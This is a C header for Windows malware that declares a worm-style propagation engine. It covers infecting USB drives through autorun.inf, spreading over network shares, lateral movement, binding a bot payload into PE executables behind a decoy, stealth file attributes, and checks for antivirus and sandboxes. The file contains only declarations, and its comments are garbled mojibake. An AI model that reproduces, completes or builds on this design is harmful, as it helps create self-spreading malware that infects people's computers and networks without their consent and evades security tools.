#ifndef PROPAGATION_H
#define PROPAGATION_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <psapi.h>
#include "../comm/version_detect.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")

// Windows�汾������
#define WIN8_MAJOR_VERSION 6
#define WIN8_MINOR_VERSION 2
#define WIN10_MAJOR_VERSION 10
#define WIN11_BUILD_NUMBER 22000

// ��������
#define MAX_TARGETS 100
#define MAX_PATH_LEN 512
#define PROPAGATION_DELAY 10000  // 10���ӳ�
#define USB_SCAN_INTERVAL 30000  // 30��ɨ����
#define BINDER_MAGIC 0xDEADBEEF
#define BIND_SECTION_NAME ".bind"

// ������ʽö��
typedef enum {
    PROP_USB_DRIVES,
    PROP_NETWORK_SHARES,
    PROP_SHARED_FOLDERS,
    PROP_REMOVABLE_MEDIA,
    PROP_LATERAL_MOVEMENT,
    PROP_FILE_BINDING
} PropagationMethod;

// Ŀ����Ϣ�ṹ
typedef struct {
    WCHAR path[MAX_PATH_LEN];
    PropagationMethod method;
    BOOL infected;
    SYSTEMTIME timestamp;
    DWORD file_size;
    WCHAR original_name[MAX_PATH];
} PropagationTarget;

// ����ͳ��
typedef struct {
    int total_attempts;
    int successful_infections;
    int failed_attempts;
    int usb_infections;
    int network_infections;
    int file_bindings;
    SYSTEMTIME last_propagation;
    PropagationTarget targets[MAX_TARGETS];
    int target_count;
} PropagationStats;

// Windows�汾��Ϣ
typedef struct {
    DWORD major_version;
    DWORD minor_version;
    DWORD build_number;
    WCHAR version_string[64];
    BOOL is_64bit;
} WindowsVersionInfo;

// �ļ��󶨽ṹ
typedef struct {
    DWORD magic;
    DWORD bot_size;
    DWORD decoy_size;
    BYTE data[1]; // �ɱ䳤������
} BindingData;

// ȫ�ֱ���
extern PropagationStats g_prop_stats;
extern WindowsVersionInfo g_win_info;
extern HANDLE g_propagation_thread;
extern BOOL g_propagation_active;

// ���Ĵ�������
BOOL initialize_propagation();
void cleanup_propagation();
BOOL start_propagation_engine();
void stop_propagation_engine();

// Windows�汾���ͼ�����
WindowsVersion detect_windows_version();
BOOL is_windows_compatible();
BOOL setup_compatibility_mode();
BOOL check_system_requirements();

// �ļ��󶨴���
BOOL create_bound_executable(const WCHAR* bot_path, const WCHAR* decoy_path, const WCHAR* output_path);
BOOL extract_and_execute_payloads(const WCHAR* bound_file);
BOOL find_binding_section(HANDLE hFile, BindingData** binding_data);
BOOL create_binding_section(HANDLE hFile, const BYTE* bot_data, DWORD bot_size, 
                           const BYTE* decoy_data, DWORD decoy_size);

// USB����
BOOL scan_usb_drives();
BOOL infect_usb_drive(const WCHAR* drive_letter);
BOOL create_autorun_inf(const WCHAR* drive_path, const WCHAR* executable_name);
BOOL copy_bound_executable_to_usb(const WCHAR* drive_path);

// ���紫��
BOOL scan_network_shares();
BOOL infect_network_share(const WCHAR* share_path);
BOOL enumerate_network_resources();
BOOL attempt_lateral_movement();

// �ļ�αװ������
WCHAR* generate_decoy_filename();
BOOL set_file_attributes_stealth(const WCHAR* file_path);
BOOL create_decoy_icon(const WCHAR* file_path);
BOOL modify_file_properties(const WCHAR* file_path, const WCHAR* description);

// Ŀ���ļ�����
BOOL scan_for_executable_targets();
BOOL find_popular_applications();
BOOL identify_user_documents();
BOOL locate_system_utilities();

// ��ȫ��������
BOOL check_antivirus_presence();
BOOL avoid_detection_mechanisms();
BOOL randomize_propagation_timing();
BOOL check_sandbox_environment();

// ���ߺ���
BOOL is_target_already_infected(const WCHAR* target_path);
BOOL mark_target_as_infected(const WCHAR* target_path);
BOOL copy_file_with_attributes(const WCHAR* source, const WCHAR* destination);
BOOL get_temp_file_path(WCHAR* temp_path, const WCHAR* prefix);
BOOL execute_file_silently(const WCHAR* file_path);

// PE�ļ�����
BOOL is_valid_pe_file(const WCHAR* file_path);
BOOL get_pe_architecture(const WCHAR* file_path, BOOL* is_64bit);
BOOL add_section_to_pe(const WCHAR* file_path, const char* section_name, 
                       const BYTE* data, DWORD data_size);
BOOL find_pe_section(const WCHAR* file_path, const char* section_name, 
                     BYTE** section_data, DWORD* section_size);

// ��־��ͳ��
void log_propagation_attempt(const WCHAR* target, PropagationMethod method, BOOL success);
void update_propagation_stats(PropagationMethod method, BOOL success);
BOOL save_propagation_log(const WCHAR* log_path);
void print_propagation_statistics();

// ���úͿ���
BOOL load_propagation_config();
BOOL should_propagate_now();
BOOL is_propagation_allowed();
void set_propagation_limits();

#endif // PROPAGATION_H
